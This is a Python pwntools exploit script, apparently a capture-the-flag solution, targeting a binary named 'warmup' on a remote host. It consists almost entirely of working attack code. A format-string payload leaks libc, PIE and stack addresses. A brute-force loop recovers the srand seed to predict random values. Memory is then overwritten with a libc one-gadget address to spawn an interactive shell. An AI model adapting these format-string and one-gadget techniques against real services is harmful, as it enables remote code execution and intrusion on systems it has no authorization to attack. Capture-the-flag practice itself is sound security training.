from pwn import *
from ctypes import *

e = ELF('./warmup')
libc = ELF('./libc-2.23.so')
clib = CDLL(libc.path)
#  p = e.process()
p = remote('192.46.228.70', 32338)

srand = clib.srand
rand = clib.rand

# context.log_level = 0

offset = 0x1270

p.sendlineafter(b'? ',b'100000000')
p.sendlineafter(b': ',b'%88c%13$hhnAAAA%1$p %6$p %20$p')

p.recvuntil(b'AAAA')
base = int(p.recvuntil(b' '),16) - libc.symbols['_IO_2_1_stdout_'] - 131
pie = int(p.recvuntil(b' '),16) - offset
stack = int(p.recvuntil(b' '),16)
print(hex(base))
print(hex(pie))
print(hex(stack))

p.recvuntil(b'money: ')
bmoney = int(p.recvuntil(b' '))
heap = bmoney - 0x10
print(hex(heap))

p.sendlineafter(b'): ',b'1')
p.sendlineafter(b': ',b'0')

p.recvuntil(b'number: ')
a = int(p.recvline())

p.recvuntil(b'money: ')
amoney = int(p.recvuntil(b' '))
b = (bmoney - amoney - 1)
print(a,b)

for i in range(1<<24):
    srand(i)
    if rand() == a and rand() == b:
        print(hex(i))
        break

c = rand()
d = rand()

diff = (stack - amoney)

p.sendlineafter(b'): ',str(diff - d))
p.sendlineafter(b': ',str(c))

p.recvuntil(b'money: ')
buf = int(p.recvuntil(b' '))
print(hex(buf))

oneshot = 0x4527a + base

p.sendlineafter(b'): ',b'0')
pay = p64(oneshot)*4
pay += p64(0)*0x20

p.sendafter(b': ',pay)


p.interactive()
